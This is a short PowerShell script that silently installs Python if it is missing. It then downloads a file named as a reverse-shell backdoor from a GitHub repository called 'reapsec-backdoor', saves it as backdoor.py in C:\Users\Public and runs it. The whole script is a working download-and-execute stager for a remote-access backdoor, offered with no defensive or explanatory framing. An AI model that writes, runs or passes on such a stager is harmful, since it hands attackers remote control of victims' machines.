# is python installed?
if (-Not (Get-Command python -ErrorAction SilentlyContinue)) {
    # Download and install Python
    Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.9.13/python-3.9.13-amd64.exe' -OutFile 'C:\Users\Public\python-installer.exe'
    Start-Process 'C:\Users\Public\python-installer.exe' -ArgumentList '/quiet InstallAllUsers=1 PrependPath=1' -Wait
    Remove-Item -Path 'C:\Users\Public\python-installer.exe'
}

# download python
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ternall/reapsec-backdoor/main/REAPSEC%20REVERSE%20SHELL%20(project).py' -OutFile 'C:\Users\Public\backdoor.py'
Start-Process python 'C:\Users\Public\backdoor.py'
